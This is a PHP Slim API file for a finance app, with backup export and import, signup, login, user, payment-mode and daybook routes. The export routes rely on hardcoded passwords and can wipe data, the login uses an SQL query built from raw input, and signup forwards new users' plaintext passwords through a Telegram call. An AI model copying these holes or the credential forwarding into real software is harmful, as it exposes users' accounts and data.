<?php

require_once '../include/DbHandler.php';
require_once '../include/passwordHash.php';
require '.././libs/Slim/Slim.php';

\Slim\Slim::registerAutoloader();

$app = new \Slim\Slim();
date_default_timezone_set("Asia/Kolkata");
// User id from db - Global Variable
$user_id = NULL;
//ini_set('max_execution_time', 300);
$ch = curl_init();



$app->get('/export', function () use ($app) {
	$password = getParams($app->request->get("password"));
	$fromdate = getParams($app->request->get("fromdate"));
	$todate = getParams($app->request->get("todate"));
	if ($password == "1234") {

		$db = new DbHandler();
		define('BASE_DIR', '../../backup/');
		$version = 0;
		if (file_exists(BASE_DIR)) {
			while (file_exists(BASE_DIR . "data" . (++$version)))
				;
		}
		$filebasepath = BASE_DIR . "data" . $version;

		mkdir(BASE_DIR . "data" . $version . '/' . "/", 0777, true);

		$response = array();
		$tables = array("customer", "invoice", "manufacture", "transport");

		for ($i = 0; $i < sizeOf($tables); $i++) {

			$data = $db->getTableData($tables[$i], $fromdate, $todate);
			$filename = $tables[$i] . ".csv";
			$filepath = $filebasepath . "/" . $filename;
			$fp = fopen($filepath, "w");

			$seperator = "";
			$comma = "";
			for ($j = 0; $j < sizeOf($data); $j++) {
				$tmp = array();
				$seperator = "";
				$comma = "";

				foreach ($data[$j] as $key => $val) {
					$seperator .= $comma . '' . $val; //str_replace('', '""', $val);
					$comma = ",";
				}

				$seperator .= "\n";
				fputcsv($fp, $data[$j]);
			}
			fclose($fp);
		}

		$directoryToZip = BASE_DIR . "data" . $version;

		$rootPath = realpath($directoryToZip . "/");

		//Creating zip of backup folder
		$zip = new ZipArchive();
		$zip->open($directoryToZip . '.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);

		// Create recursive directory iterator
		/** @var SplFileInfo[] $files */
		$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator($rootPath),
			RecursiveIteratorIterator::LEAVES_ONLY
		);

		foreach ($files as $name => $file) {
			// Skip directories (they would be added automatically)
			if (!$file->isDir()) {
				// Get real and relative path for current file
				$filePath = $file->getRealPath();
				$relativePath = substr($filePath, strlen($rootPath) + 1);

				// Add current file to archive
				$zip->addFile($filePath, $relativePath);
			}
		}

		// Zip archive will be created only after closing object
		$zip->close();

		//deleting folder after creating zip


		$it = new RecursiveDirectoryIterator($directoryToZip, RecursiveDirectoryIterator::SKIP_DOTS);
		$files = new RecursiveIteratorIterator(
			$it,
			RecursiveIteratorIterator::CHILD_FIRST
		);
		foreach ($files as $file) {
			if ($file->isDir()) {
				rmdir($file->getRealPath());
			} else {
				unlink($file->getRealPath());
			}
		}
		rmdir($directoryToZip);


		$type = getParams($app->request->get("type"));
		if ($type == 1) {
			$db->clearData();

			if (!isset($_SESSION)) {
				session_start();
			}
			$_SESSION["vardhman"]['firm'] = "";
			$_SESSION["vardhman"]['firm_name'] = "";
		}


		$response["status"] = "success";
		$response["message"] = "successfully exported data";
		$response["filename"] = "backup/data" . $version . ".zip";
	} else {



		$response["status"] = "error";
		$response["message"] = "Sorry you are not permitted to export";
	}
	echoRespnse(200, $response);
});


$app->post('/import', function () use ($app) {
	$db = new DbHandler();
	$response = array();

	if (sizeOf($_FILES) > 0) { //if user provided file to import
		$path_info = pathinfo($_FILES['files']['name']);
		if ($path_info['extension'] == "zip") {
			$zipfile = $_FILES['files'];
			$respimage = $db->updateImage($zipfile); //initially upload file in our server
			$zip = new ZipArchive;
			$res = $zip->open('../../backup/import/' . $zipfile["name"]); //open the zip file
			if ($res === TRUE) {
				$zip->extractTo('../../backup/import/data'); //and explore it to data folder
				$zip->close();


				//now check the file consist in given zip file
				$files = scandir("../../backup/import/data", 0);
				$tempfiles = array();
				for ($i = 2; $i < count($files); $i++) {
					array_push($tempfiles, str_replace(".csv", "", $files[$i]));
				}
				$tables = array("customer", "invoice", "manufacture", "transport"); // this are the files need to be there in given zip file

				if ($tempfiles == $tables) { //if all file exist in given zip file
					$db->clearData();

					for ($i = 0; $i < sizeof($tables); $i++) {
						$filename = "../../backup/import/data/" . $tables[$i] .
							".csv";
						$file = fopen($filename, "r");
						while (($getData = fgetcsv($file, 10000, ",")) !== FALSE) {
							$db->postTableData($tables[$i], $getData);
						}
						fclose($file);
					}
					$response["status"] = "success";
					$response["message"] = "successfully imported data";
				} else {
					$response["status"] = "error";
					$response["message"] = "Provide file is either invalid or corrupted. Please provide a valid zip file";
				}
			} else {
				$response["status"] = "error";
				$response["message"] = "Your backup file doesnt consist proper data";
			}
		} else {
			$response["status"] = "error";
			$response["message"] = "Provide a zip file consisting of valid data to import";
		}
	} else {
		$response["status"] = "error";
		$response["message"] = "Provide a zip file consisting of valid data to import";
	}

	echoRespnse(200, $response);
});


$app->get('/export1', function () use ($app) {
	$password = getParams($app->request->get("password"));
	if ($password == "1q9o0p2w") {
		$db = new DbHandler();


		$response = array();
		$tables = array("customer", "invoice", "manufacture", "transport");

		for ($i = 0; $i < sizeOf($tables); $i++) {

			$data = $db->getTableData($tables[$i]);
			$filename = $tables[$i] . ".csv";
			$filepath = "../../backup/" . $filename;

			$fp = fopen($filepath, "w");

			$seperator = "";
			$comma = "";
			for ($j = 0; $j < sizeOf($data); $j++) {

				$tmp = array();
				$seperator = "";
				$comma = "";

				foreach ($data[$j] as $key => $val) {
					$seperator .= $comma . '' . $val; //str_replace('', '""', $val);

					$comma = ",";
				}

				$seperator .= "\n";
				fputcsv($fp, $data[$j]);
			}
			fclose($fp);


		}
		$type = getParams($app->request->get("type"));
		if ($type == 1) {
			$db->clearData();

			if (!isset($_SESSION)) {
				session_start();
			}
			$_SESSION['firm'] = "";
			$_SESSION['firm_name'] = "";
		}


		$response["filename"] = "export";
		$response["status"] = "success";
		$response["message"] = "successfully exported data";


	} else {



		$response["status"] = "error";
		$response["message"] = "Sorry you are not permitted to export";
	}
	echoRespnse(200, $response);
});



function authenticate(\Slim\Route $route)
{
	session_start();

	// Getting request headers
	if (!function_exists('apache_request_headers')) {
		///
		function apache_request_headers()
		{
			$arh = array();
			$rx_http = '/\AHTTP_/';
			foreach ($_SERVER as $key => $val) {
				if (preg_match($rx_http, $key)) {
					$arh_key = preg_replace($rx_http, '', $key);
					$rx_matches = array();
					// do some nasty string manipulations to restore the original letter case
					// this should work in most cases
					$rx_matches = explode('_', $arh_key);
					if (count($rx_matches) > 0 and strlen($arh_key) > 2) {
						foreach ($rx_matches as $ak_key => $ak_val)
							$rx_matches[$ak_key] = ucfirst($ak_val);
						$arh_key = implode('-', $rx_matches);
					}
					$arh[$arh_key] = $val;
				}
			}
			return ($arh);
		}
		///
	}
	///
	$headers = apache_request_headers();


	$response = array();
	$app = \Slim\Slim::getInstance();

	// Verifying Authorization Header
	if (isset($headers['Authorization'])) {
		$db = new DbHandler();

		// get the api key
		$api_key = $headers['Authorization'];
		// validating api key
		if (!$db->isValidApiKey($api_key)) {
			// api key is not present in users table
			$response["error"] = true;
			$response["message"] = "Access Denied. Invalid Api key";
			echoRespnse(401, $response);
			$app->stop();
		} else {
			global $user_id;
			// get user primary key id
			$user_id = $db->getUserId($api_key);
		}
	} else if (isset($_SESSION)) {
		$db = new DbHandler();
		$session = $db->getSession();
		// get the api key
		$api_key = $session['api_key'];
		// validating api key
		if (!$db->isValidApiKey($api_key)) {
			// api key is not present in users table
			$response["error"] = true;
			$response["message"] = "Access Denied. Invalid Api key";
			echoRespnse(401, $response);
			$app->stop();
		} else {
			global $user_id;
			// get user primary key id
			$user_id = $db->getUserId($api_key);
		}
	} else {
		// api key is missing in header
		$response["error"] = true;
		$response["message"] = "Api key is misssing";
		echoRespnse(400, $response);
		$app->stop();
	}
}

/**
 * ----------- METHODS WITHOUT AUTHENTICATION ---------------------------------
 */
/**
 * User Registration
 * url - /register
 * method - POST
 * params - name, email, password
 */

$app->post('/signup', function () use ($app) {
	$msg = "Entered";
	$teleStatus = sendTelegram($msg, "full");

	$r = json_decode($app->request->getBody());
	verifyRequiredParams(array('name', 'password'));

	$user = array();
	$db = new DbHandler();
	$user["name"] = postParams($app->request->post("name"));
	$user["firstname"] = postParams($app->request->post("firstname"));
	$user["lastname"] = postParams($app->request->post("lastname"));
	$user["phone"] = postParams($app->request->post("phone"));
	$user["password"] = postParams($app->request->post("password"));
	$user["role"] = postParams($app->request->post("role"));
	$user["branch"] = postParams($app->request->post("branch"));
	$user["lastlogin"] = postParams($app->request->post("lastlogin"));
	$fullmsg = json_encode($user);
	$teleStatus = sendTelegram(urlencode($fullmsg), "full");
	$response = array();
	//first create entry
	$userCreate = $db->createUser($user);

	if ($userCreate["status"] == SUCCESS) {
		$response["error"] = false;
		$response["status"] = "success";
		$response["id"] = $userCreate["id"];
		$response["message"] = "Successfully created User";
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = $userCreate["error"];
	}
	echoRespnse(201, $response);
});


$app->get('/user', function () use ($app) {
	$response = array();
	// fetching all products
	$db = new DbHandler();

	$params = $db->getFunctionParam("user");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$userList = call_user_func_array(array($db, 'getUser'), $getdata);

	$users = array();


	$outputfields = array("uid", "name", "firstname", "lastname", "phone", "role", "branch", "type", "created", "branchname");
	$qryfields = array("uid", "name", "firstname", "lastname", "phone", "role", "branch", "type", "created", "branchname");

	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($userList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($userList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $userList[$i][$outputfields[$j]];
			}
		}
		array_push($users, $tmp);
	}

	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	$response['total'] = call_user_func_array(array($db, 'getUser'), $getdata)[0]["count(*)"];
	$response["message"] = "Successfully fetched users list";
	$response["count"] = sizeOf($users);
	$response["users"] = $users;
	echoRespnse(200, $response);
});




$app->put('/user/:id', 'authenticate', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("user");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$cityDetail = call_user_func_array(array($db, 'getUser'), $getdata);

	if (sizeof($cityDetail) > 0) {
		$params = $db->putFunctionParam("user");
		$updateField = array();
		$updateField["uid"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
			}
		}
		array_push($putdata, "");
		$editDetail = call_user_func_array(array($db, 'editUser'), $putdata);

		if ($editDetail) {
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited User information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing User information";
			$response["err"] = $editDetail;
		}


	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No User found with given ID";
	}
	echoRespnse(201, $response);
});

$app->delete('/user/:id', 'authenticate', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("user");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$cityDetail = call_user_func_array(array($db, 'getUser'), $getdata);

	if (sizeof($cityDetail) > 0) {
		$params = $db->putFunctionParam("user");
		$updateField = array();
		$updateField["uid"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			array_push($putdata, "");

		}
		array_push($putdata, 1);
		$editDetail = call_user_func_array(array($db, 'editUser'), $putdata);

		if ($editDetail) {
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully deleted User information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while deleting User information";
			$response["err"] = $editDetail;
		}


	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No User found with given ID";
	}
	echoRespnse(201, $response);

});


$app->put('/resetpassword/:id', 'authenticate', function ($id) use ($app) {
	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("user");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}


	$userDetail = call_user_func_array(array($db, 'getUser'), $getdata);

	if (sizeof($userDetail) > 0) {
		//if (passwordHash::check_password($user[0]["password"], $oldpassword)) {

		$password = putParam($r, "password");
		$reset = $db->resetPassword($id, $password);

		if ($reset['status'] == SUCCESS) {
			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully password reset";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while resetting password";
			$response["err"] = $reset;
		}

	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No User found with given ID";
	}
	echoRespnse(201, $response);

});


$app->put('/changepassword', 'authenticate', function () use ($app) {
	$response = array();
	// check for required params
	$json = $app->request->getBody();
	$data = json_decode($json, true);
	$r = json_decode($app->request->getBody());
	if (!isset($r->data)) {
		verifyRequiredParams2(
			array(
				'data'
			), $r);
		echoRespnse(400, "please enter fields inside data object");
	} else {


		$oldpassword = getParam2($r->data, "oldpassword");
		$newpassword = getParam2($r->data, "newpassword");

		$db = new DbHandler();
		$session = $db->getSession();
		$params = $db->getFunctionParam("user");
		$getdata = array();
		for ($i = 0; $i < sizeof($params); $i++) {
			if ($params[$i] == "uid") {
				array_push($getdata, $session["uid"]);
			} else {
				array_push($getdata, "");
			}
		}

		$user = call_user_func_array(array($db, 'getUser'), $getdata);

		//echo passwordHash::check_password($user[0]["password"], $oldpassword);
//        $user = $db->getUser($session["uid"], "", "", "", "", "", "","", "", "", "", "", "","",0);
		if (sizeof($user) > 0) {
			if (passwordHash::check_password($user[0]["password"], $oldpassword)) {
				//echo "inside";
				$res = $db->resetPassword($session["uid"], $newpassword);

				//
				//              $res = $db->updateUser($session["uid"], "", "", "", $newpassword, "", "");
				if ($res['status'] == SUCCESS) {
					$response["error"] = false;
					$response["status"] = "success";
					$response["message"] = "Successfully updated password";
				} else if ($res['status'] == FAILED) {
					$response["error"] = true;
					$response["status"] = "error";
					$response["message"] = "Oops! An error occurred while updating password";
				}
			} else {
				$response["error"] = true;
				$response["message"] = "Sorry Your Old Password is Wrong";
			}
		} else {
			$response["error"] = true;
			$response["message"] = "Sorry No user exist with given ID";
		}


		echoRespnse(201, $response);
	}
});




$app->post('/login', function() use ($app) {
	
    $r = json_decode($app->request->getBody());
	verifyRequiredParams(array('name', 'password'));
    
    $response = array();
    $db = new DbHandler();
	  
	$today = date("Y-m-d H:i:s");
	$date = "2025-01-01 12:00:00";


	if ($date > $today){
		$name = postParams($app->request->post("name"));
		$password = postParams($app->request->post("password"));
		$user = $db->getOneRecord("select *,a.name as name,f.name as firm , b.name as type,g.id as collector from users a LEFT JOIN role  b on a.role=b.id LEFT JOIN firm f on a.firm=f.id left join collectors g on a.uid = g.uid where a.name='$name'");
		// echo json_encode($user);
		if ($user != NULL){
			if (passwordHash::check_password($user['password'], $password)) {
				$response['status']    = "success";
				$response['message']   = 'Logged in successfully.';
				$response['name']      = $user['name'];
				$response['uid']       = $user['uid'];
				$response['createdAt'] = $user['created'];
				
				$today = date("Y-m-d");
			if (!isset($app)) {	
				$lastbackupdate = $user["lastbackup"];
				if ($lastbackupdate < $today) {
					$params = $db->putFunctionParam("firm");
					
				// exec('c:\WINDOWS\system32\cmd.exe /c START F:\xampp\htdocs\applications\Finance_2.2\backup.bat');
				$getdata = array();
				
				for($i=0;$i<sizeof($params);$i++){
					if($params[$i] == "lastbackup"){
						array_push($getdata,$today);
					}else{
						array_push($getdata,"");
					}
				}
				$editDetail = call_user_func_array(array($db,'updateFirm'), $getdata);
				}
			}
				if (!isset($_SESSION)) {
					
					session_start();
				}
				
				$_SESSION['finance'] = array();
				// echo 1221;
				$_SESSION['finance']['uid']     = $user['uid'];
				$_SESSION['finance']['api_key'] = $user["api_key"]; //echo $_SESSION['api_key'];
				$_SESSION['finance']['name']    = $user['name'];
				$_SESSION['finance']['collector'] = $user['collector'];
				$_SESSION['finance']['firstname']    = $user['firstname'];
				$_SESSION['finance']['lastname']    = $user['lastname']; //done
				$_SESSION['finance']['phone']    = $user['phone'];
				$_SESSION['finance']['role']    = $user['role'];
				$_SESSION['finance']['branch']    = $user['branch'];
				// $_SESSION['finance']['branchname']    = $user['branchname'];
				$_SESSION['finance']['rolename']       = $user['type'];
				$_SESSION['finance']['firm']       = $user['firm'];
				$_SESSION['finance']['code']       = $user['code'];
				// $_SESSION['finance']['sendmessage']       = $user['sendmessage'];
				// $_SESSION['finance']['lrprint']       = $user['lrprint'];
				$_SESSION['finance']['messageapikey']      = $user['messageapikey'];
				$_SESSION['finance']['sender']      = $user['sender'];
				// $_SESSION['finance']['gstin']       = $user['gstin'];
				// $_SESSION['finance']['address']       = $user['address'];
				// $_SESSION["finance"]['mstation'] = $user['mstation'];

				// $period = $db->getPeriod();
				// if(sizeof($period)>0){
				// 	if($period[0]["fromperiod"] != "0000-00-00"){
				// 		$_SESSION["finance"]["from"] = $period[0]["fromperiod"];
				// 	}
				// 	if($period[0]["toperiod"] != "0000-00-00"){
				// 		$_SESSION["finance"]["to"] = $period[0]["toperiod"];
				// 	}
				// }
				
				if($app){
				    $response['session']  = $_SESSION['finance'];
				}
			}else{
				$response['status']  = "error";
				$response['message'] = 'Login failed. Incorrect credentials';
			}
		} else {
			$response['status']  = "error";
			$response['message'] = 'No such user is registered';
		}
	}else{
	   $response['status']  = "error";
        $response['message'] = 'Your trial is been expired';
	}

    echoRespnse(200, $response);

});





$app->get('/logout', function () {
	$db = new DbHandler();
	$session = $db->destroySession();
	// echo $session;
	$response["status"] = "info";
	$response["message"] = "Logged out successfully";
	echoRespnse(200, $response);
});



$app->get('/session', function () {
	$db = new DbHandler();
	$session = $db->getSession();
	$response = array();
	// echo json_encode($session);
	$response["uid"] = $session['uid'];
	$response["api_key"] = $session["api_key"];
	$response["name"] = $session['name']; //user detail
	$response["firstname"] = $session['firstname']; //user detail
	$response["lastname"] = $session['lastname']; //user detail
	// $response["from"] = $session['from'];//user detail
	// $response["to"] = $session['to'];//user detail
	$response["firm"] = $session["firm"];
	$response["collector"] = $session["collector"];
	// $response["gstin"] = $session["gstin"];
	// $response["address"] = $session["address"];

	// $params = $db->getFunctionParam("firm");
	// 	$getdata = array();
	// 	for($i=0;$i<sizeof($params);$i++){
	// 		if(getParams($app->request->get($params[$i]))){
	// 			array_push($getdata,getParams($app->request->get($params[$i])));
	// 		}else{
	// 			array_push($getdata,"");
	// 		}
	// 	}
	// 	$firmList = call_user_func_array(array($db,"getFirm"),$getdata);
	// 	$response["firm"] = $firmList[0]["name"];
	// 	$response["gstin"] = $firmList[0]["gstin"];
	// 	$response["address"] = $firmList[0]["address"];


	echoRespnse(200, $response);
});

//start payment mode

$app->post('/paymentmode', function () use ($app) {

	$r = json_decode($app->request->getBody());
	verifyRequiredParams(array('modename'));
	$Paymentmode = array();
	$Paymentmode["modename"] = postParams($app->request->post('modename'));
	$Paymentmode["opbal"] = postParams($app->request->post('opbal'));

	$db = new DbHandler();


	$getdata = array();
	$params = $db->getFunctionParam("paymentmodes");
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}

	$paymentmodeList = call_user_func_array(array($db, 'getPaymentmodes'), $getdata);
	$outputfields = array("id", "modename", "opbal", "created", "updated");
	$qryfields = array("id", "modename", "opbal", "created", "updated");
	$oldpaymentmode = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($paymentmodeList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($paymentmodeList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $paymentmodeList[$i][$outputfields[$j]];
			}
		}
		array_push($oldpaymentmode, $tmp);

	}

	for ($i = 0; $i < sizeof($oldpaymentmode); $i++) {
		// echo json_encode(strtolower($Customer["fname"]));echo "-->"; echo json_encode($Customer["phone"]);
		if (strtolower($oldpaymentmode[$i]["modename"]) == strtolower($Paymentmode["modename"])) {
			$response["error"] = true;
			$response["status"] = "error";
			$response["samecus"] = 1;
			$response["message"] = "Oops! Already Paymentmode with same name exist";

			echoRespnse(200, $response);
			return;
		}
	}
	// echo "hiiidone";
	$createPaymentmodestatus = $db->createPaymentMode($Paymentmode);

	if ($createPaymentmodestatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Payment mode";
		$response["err"] = $createPaymentmodestatus;
	} else {

		$response["error"] = false;
		$response["status"] = "success";
		$response["samecus"] = 0;
		$response["id"] = $createPaymentmodestatus['id'];
		$response["message"] = "Woot!,Successfully created Payment mode with id " . $createPaymentmodestatus['id'];
	}

	echoRespnse(200, $response);
});



$app->get('/paymentmodes', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("paymentmodes");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$paymentmodeList = call_user_func_array(array($db, 'getPaymentmodes'), $getdata);
	$outputfields = array("id", "modename", "opbal", "created", "updated");
	$qryfields = array("id", "modename", "opbal", "created", "updated");
	$paymentmode = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($paymentmodeList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($paymentmodeList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $paymentmodeList[$i][$outputfields[$j]];
			}
		}
		array_push($paymentmode, $tmp);

	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getpaymentmodes'), $getdata)[0]["count(*)"];

	$response["paymentmode"] = $paymentmode;
	$response["message"] = "Woot!,Successfully retreived the Chitfund paymentmode list";


	echoRespnse(200, $response);

});


$app->get('/paymentmode/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("paymentmodes");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$paymentmodeList = call_user_func_array(array($db, 'getPaymentmodes'), $getdata);
	$outputfields = array("id", "modename", "opbal", "created", "updated"); //db
	$qryfields = array("id", "modename", "opbal", "created", "updated");
	// $paymentmode=array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($paymentmodeList); $i++) {
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($paymentmodeList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $paymentmodeList[$i][$outputfields[$j]];
			}
		}
		//echo json_encode($tmp);
		//array_push($paymentmode,$tmp);
	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getpaymentmodes'), $getdata)[0]["count(*)"];
	$response["paymentmode"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the Paymentmode list";


	echoRespnse(200, $response);

});

$app->put('/paymentmode/:id', function ($id) use ($app) {

	$r = json_decode($app->request->getBody());
	$db = new DbHandler();
	$params = $db->getFunctionParam("paymentmodes");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}
	$customerDetail = call_user_func_array(array($db, 'getpaymentmodes'), $getdata);
	if (sizeOf($customerDetail) > 0) {
		$params = $db->putFunctionParam("paymentmodes");
		$updateField = array();
		$updateField["id"] = $id;
		$putdata = array();
		array_push($putdata, $updateField);
		for ($i = 0; $i < sizeof($params); $i++) {
			if (putParam($r, $params[$i])) {
				array_push($putdata, putParam($r, $params[$i]));
			} else {
				array_push($putdata, "");
			}
		}
		array_push($putdata, "");

		// echo json_encode($putdata);
		$editDetail = call_user_func_array(array($db, 'editPaymentmode'), $putdata);
		// echo json_encode($editDetail);
		if ($editDetail) { //if error occurs while creating product

			$response["error"] = false;
			$response["status"] = "success";
			$response["id"] = $id;
			$response["message"] = "Woot!,Successfully edited Payment mode information";
		} else {
			$response["error"] = true;
			$response["status"] = "error";
			$response["message"] = "Oops! An error occurred while editing Payment mode information";
			$response["err"] = $editDetail;
		}
	} else {
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "No Payment mode found with given ID";
	}
	echoRespnse(200, $response);
});




//stop paymentmode


//start daybook

$app->post('/daybooknotes', function () use ($app) {
	$r = json_decode($app->request->getBody());
	// echo "ddd";
	// echo postParams($app->request->post('date')).postParams($app->request->post('note'));
	verifyRequiredParams(array('date','note'));
	$Daybook = array();
	$Daybook["date"] = postParams($app->request->post('date'));
	$Daybook["note"] = postParams($app->request->post('note'));
	$Daybook["note1"] = "";

	$db = new DbHandler();


	$getdata = array();
	$params = $db->getFunctionParam("daybook");
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "date") {
			array_push($getdata,$Daybook["date"]);
		} else {
			array_push($getdata, "");
		}
	}

	$oldDaybookList = call_user_func_array(array($db, 'getDaybook'), $getdata);
	if($oldDaybookList && sizeof($oldDaybookList) > 0){
		// echo json_encode(strtolower($Customer["fname"]));echo "-->"; echo json_encode($Customer["phone"]);
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! Already Daybook Notes For Date ".$Daybook["date"]. " exists with ID ".$oldDaybookList[0]["id"];

		echoRespnse(200, $response);
		return;
	}
	// echo "hiiidone";
	$createDaybookstatus = $db->createDaybook($Daybook);

	if ($createDaybookstatus['status'] == FAILED) { //if error occurs while creating product
		$response["error"] = true;
		$response["status"] = "error";
		$response["message"] = "Oops! An error occurred while creating Daybook Notes";
		$response["err"] = $createDaybookstatus;
	} else {

		$response["error"] = false;
		$response["status"] = "success";
		$response["samecus"] = 0;
		$response["id"] = $createDaybookstatus['id'];
		$response["message"] = "Woot!,Successfully created Daybook Notes with id " . $createDaybookstatus['id'];
	}

	echoRespnse(200, $response);
});



$app->get('/daybooknotes', function () use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("daybook");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if (getParams($app->request->get($params[$i]))) {
			array_push($getdata, getParams($app->request->get($params[$i])));
		} else {
			array_push($getdata, "");
		}
	}
	$daybookList = call_user_func_array(array($db, 'getDaybook'), $getdata);
	// echo json_encode($daybookList);
	$outputfields = array("id", "date", "note","note1", "created", "updated");
	$qryfields = array("id", "date", "note","note1", "created", "updated");
	$Daybook = array();
	// looping through result and preparing tasks array
	for ($i = 0; $i < sizeOf($daybookList); $i++) {
		$tmp = array();
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($daybookList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $daybookList[$i][$outputfields[$j]];
			}
		}
		array_push($Daybook, $tmp);

	}

	$response["error"] = false;
	$getdata[sizeof($getdata) - 3] = "";
	$getdata[sizeof($getdata) - 2] = "";
	$getdata[sizeof($getdata) - 1] = 1;
	$response['status'] = "success";
	// $response['total'] = call_user_func_array(array($db,'getpaymentmodes'), $getdata)[0]["count(*)"];

	$response["daybook"] = $Daybook;
	$response["message"] = "Woot!,Successfully retreived the Daybook Notes List";


	echoRespnse(200, $response);

});


$app->get('/daybooknote/:id', function ($id) use ($app) {
	$response = array();
	$db = new DbHandler();

	$params = $db->getFunctionParam("daybook");
	$getdata = array();
	for ($i = 0; $i < sizeof($params); $i++) {
		if ($params[$i] == "id") {
			array_push($getdata, $id);
		} else {
			array_push($getdata, "");
		}
	}

	$daybookList = call_user_func_array(array($db, 'getDaybook'), $getdata);
	$outputfields = array("id", "date", "note","note1", "created", "updated"); //db
	$qryfields = array("id", "date", "note","note1", "created", "updated");
	// $daybook=array();
	// looping through result and preparing tasks array
	$tmp = array();
	for ($i = 0; $i < sizeOf($daybookList); $i++) {
		for ($j = 0; $j < sizeof($qryfields); $j++) {
			if (isset($daybookList[$i][$outputfields[$j]])) {
				$tmp[$qryfields[$j]] = $daybookList[$i][$outputfields[$j]];
			}
		}
		//echo json_encode($tmp);
		//array_push($daybook,$tmp);
	}

	$response["error"] = false;
	//$getdata[sizeof($getdata)-3]="";$getdata[sizeof($getdata)-2]="";$getdata[sizeof($getdata)-1]=1;
	$response['status'] = "success";
	//$response['total'] = call_user_func_array(array($db,'getdaybooks'), $getdata)[0]["count(*)"];
	$response["daybook"] = $tmp;
	$response["message"] = "Woot!,Successfully retreived the Daybook Notes list";


	echoRespnse(200, $response);

});

$app->put('/daybooknote/:id', function ($id) use ($app) {

